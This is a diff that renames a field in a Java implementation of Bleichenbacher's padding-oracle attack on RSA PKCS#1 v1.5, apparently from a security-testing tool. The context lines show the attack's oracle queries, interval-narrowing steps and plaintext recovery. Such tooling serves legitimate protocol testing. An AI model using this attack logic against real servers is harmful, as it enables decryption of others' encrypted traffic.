@@ -38,7 +38,7 @@ public class Bleichenbacher extends Pkcs1Attack {
     /**
      *
      */
-    protected Interval[] m;
+    protected Interval[] interval;
 
     /**
      *
@@ -56,7 +56,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         this.msgIsPKCS = msgPKCScofnorm;
         c0 = BigInteger.ZERO;
         si = BigInteger.ZERO;
-        m = null;
+        interval = null;
         // b computation
         int tmp = publicKey.getModulus().bitLength();
         tmp = (MathHelper.intCeilDiv(tmp, 8) - 2) * 8;
@@ -78,7 +78,7 @@ public class Bleichenbacher extends Pkcs1Attack {
             oracle.checkPKCSConformity(encryptedMsg);
             s0 = BigInteger.ONE;
             c0 = new BigInteger(1, encryptedMsg);
-            m =
+            interval =
                 new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
                     (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
         } else {
@@ -124,7 +124,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         c0 = new BigInteger(1, send);
         s0 = si;
         // mi = {[2B,3B-1]}
-        m =
+        interval =
             new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
                 (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
 
@@ -140,9 +140,9 @@ public class Bleichenbacher extends Pkcs1Attack {
         if (i == 1) {
             this.stepTwoA();
         } else {
-            if (i > 1 && m.length >= 2) {
+            if (i > 1 && interval.length >= 2) {
                 stepTwoB();
-            } else if (m.length == 1) {
+            } else if (interval.length == 1) {
                 stepTwoC();
             }
         }
@@ -206,14 +206,14 @@ public class Bleichenbacher extends Pkcs1Attack {
         LOGGER.debug("Step 2c: Searching with one interval left");
 
         // initial ri computation - ri = 2(b*(si-1)-2*B)/n
-        BigInteger ri = si.multiply(m[0].upper);
+        BigInteger ri = si.multiply(interval[0].upper);
         ri = ri.subtract(BigInteger.valueOf(2).multiply(bigB));
         ri = ri.multiply(BigInteger.valueOf(2));
         ri = ri.divide(n);
 
         // initial si computation
-        BigInteger upperBound = step2cComputeUpperBound(ri, n, m[0].lower);
-        BigInteger lowerBound = step2cComputeLowerBound(ri, n, m[0].upper);
+        BigInteger upperBound = step2cComputeUpperBound(ri, n, interval[0].lower);
+        BigInteger lowerBound = step2cComputeLowerBound(ri, n, interval[0].upper);
 
         // to counter .add operation in do while
         si = lowerBound.subtract(BigInteger.ONE);
@@ -224,8 +224,8 @@ public class Bleichenbacher extends Pkcs1Attack {
             if (si.compareTo(upperBound) > 0) {
                 // new values
                 ri = ri.add(BigInteger.ONE);
-                upperBound = step2cComputeUpperBound(ri, n, m[0].lower);
-                lowerBound = step2cComputeLowerBound(ri, n, m[0].upper);
+                upperBound = step2cComputeUpperBound(ri, n, interval[0].lower);
+                lowerBound = step2cComputeLowerBound(ri, n, interval[0].upper);
                 si = lowerBound;
             }
             send = prepareMsg(c0, si);
@@ -245,7 +245,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         BigInteger[] tmp;
         ArrayList<Interval> ms = new ArrayList<>();
 
-        for (Interval interval : m) {
+        for (Interval interval : interval) {
             upperBound = step3ComputeUpperBound(si, n, interval.upper);
             lowerBound = step3ComputeLowerBound(si, n, interval.lower);
 
@@ -282,15 +282,15 @@ public class Bleichenbacher extends Pkcs1Attack {
         }
 
         LOGGER.debug(" # of intervals for M" + i + ": " + ms.size());
-        m = ms.toArray(new Interval[ms.size()]);
+        interval = ms.toArray(new Interval[ms.size()]);
     }
 
     private boolean stepFour(final int i) {
         boolean result = false;
 
-        if (m.length == 1 && m[0].lower.compareTo(m[0].upper) == 0) {
+        if (interval.length == 1 && interval[0].lower.compareTo(interval[0].upper) == 0) {
             solution = s0.modInverse(publicKey.getModulus());
-            solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());
+            solution = solution.multiply(interval[0].upper).mod(publicKey.getModulus());
 
             LOGGER.info("====> Solution found!\n {}", ArrayConverter.bytesToHexString(solution.toByteArray()));
 
